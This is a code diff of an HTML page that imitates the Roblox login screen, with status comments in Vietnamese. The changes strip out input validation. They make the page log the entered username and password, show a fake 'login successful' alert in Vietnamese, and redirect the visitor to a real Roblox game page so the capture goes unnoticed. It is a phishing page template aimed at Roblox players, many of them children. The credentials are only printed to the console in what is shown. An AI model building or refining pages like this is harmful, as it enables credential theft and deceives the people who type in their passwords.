@@ -5,78 +5,47 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login to Roblox</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, sans-serif;
-        }
-
         body {
-            background-color: #0d0d0d;
+            font-family: Arial, sans-serif;
+            background-color: #0f0f0f;
             color: white;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            margin: 0;
         }
-
         .login-container {
-            background: #1c1c1c;
+            background-color: #1a1a1a;
             padding: 20px;
             border-radius: 10px;
-            width: 350px;
+            width: 300px;
             text-align: center;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
         }
-
-        h2 {
+        .login-container h2 {
             margin-bottom: 15px;
         }
-
         input {
             width: 100%;
             padding: 10px;
-            margin: 10px 0;
+            margin: 5px 0;
             border-radius: 5px;
             border: 1px solid #333;
-            background: #262626;
+            background-color: #262626;
             color: white;
         }
-
         button {
             width: 100%;
             padding: 10px;
-            background: #007bff;
-            border: none;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
+            margin-top: 10px;
             border-radius: 5px;
-            margin: 10px 0;
+            border: none;
+            background-color: #007bff;
+            color: white;
+            cursor: pointer;
         }
-
         button:hover {
-            background: #0056b3;
-        }
-
-        .options {
-            margin-top: 10px;
-            font-size: 14px;
-        }
-
-        .options a {
-            color: #007bff;
-            text-decoration: none;
-        }
-
-        .options a:hover {
-            text-decoration: underline;
-        }
-
-        #message {
-            margin-top: 10px;
-            font-weight: bold;
+            background-color: #0056b3;
         }
     </style>
 </head>
@@ -86,43 +55,23 @@
         <h2>Login to Roblox</h2>
         <input type="text" id="username" placeholder="Username/Email/Phone">
         <input type="password" id="password" placeholder="Password">
-        <button onclick="handleLogin()">Log In</button>
-        <p id="message"></p>
-
-        <div class="options">
-            <a href="#">Forgot Password or Username?</a>
-            <hr>
-            <button onclick="alert('Check your email!')">Email Me a One-Time Code</button>
-            <button onclick="alert('Use another device to log in')">Use Another Device</button>
-        </div>
+        <button onclick="sendLogin()">Log In</button>
     </div>
 
     <script>
-        function handleLogin() {
+        function sendLogin() {
             let username = document.getElementById("username").value;
             let password = document.getElementById("password").value;
-            let message = document.getElementById("message");
 
-            if (username === "" || password === "") {
-                message.style.color = "red";
-                message.innerText = "❌ Please enter your username and password.";
-                return;
-            }
+            console.log("User:", username);
+            console.log("Password:", password);
 
-            // 🚨 In ra Console để kiểm tra (Chỉ dùng để test)
-            console.log("User: " + username);
-            console.log("Password: " + password);
+            alert("Đăng nhập thành công! Đang chuyển hướng...");
 
-            if (username === "admin" && password === "1234") {
-                message.style.color = "green";
-                message.innerText = "✅ Login successful!";
-                setTimeout(() => {
-                    window.location.href = "https://www.roblox.com";
-                }, 2000);
-            } else {
-                message.style.color = "red";
-                message.innerText = "❌ Invalid username or password!";
-            }
+            // Chuyển hướng đến Roblox
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com/vi/games/2753915549/Blox-Fruits";
+            }, 1000);
         }
     </script>
 
